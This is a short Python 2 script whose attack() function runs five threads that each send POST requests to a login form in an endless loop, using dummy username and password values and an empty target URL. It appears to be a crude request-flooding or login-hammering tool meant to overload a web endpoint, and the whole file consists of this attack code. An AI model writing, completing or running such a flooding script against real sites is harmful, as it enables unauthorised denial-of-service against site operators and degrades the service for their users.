import urllib
import urllib2 
from threading import Thread

data = {
    'username': 'dummy',
    'password': 'dummy',
}

def attack():
	while True:
		req = urllib2.Request(url="",
		                      data=urllib.urlencode(data), 
		                      headers={"Content-type": "application/x-www-form-urlencoded"}) 
		response = urllib2.urlopen(req)
		the_page = response.read()
		print the_page

if __name__ == "__main__":
    thread = Thread(target = attack)
    thread2 = Thread(target = attack)
    thread3 = Thread(target = attack)
    thread4 = Thread(target = attack)
    thread5 = Thread(target = attack)
    thread.start()
    thread2.start()
    thread3.start()
    thread4.start()
    thread5.start()
    print 'Finished'